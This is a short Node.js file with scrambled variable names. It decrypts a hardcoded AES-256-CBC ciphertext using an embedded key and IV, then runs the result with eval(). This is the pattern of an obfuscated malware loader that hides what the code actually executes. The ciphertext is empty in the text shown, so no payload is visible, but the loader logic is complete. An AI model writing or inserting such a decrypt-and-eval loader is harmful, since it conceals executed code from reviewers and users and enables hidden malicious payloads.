const ito = require('crypto');
const itinho = Buffer.from('7d7b2f6201f9aa90df80ccfa9c1de631a199fc84ef0a66708968ba753a3fcc16', 'hex');
const octua = Buffer.from('3e4dedd38e9677ff7b3636b6f292d2ad', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
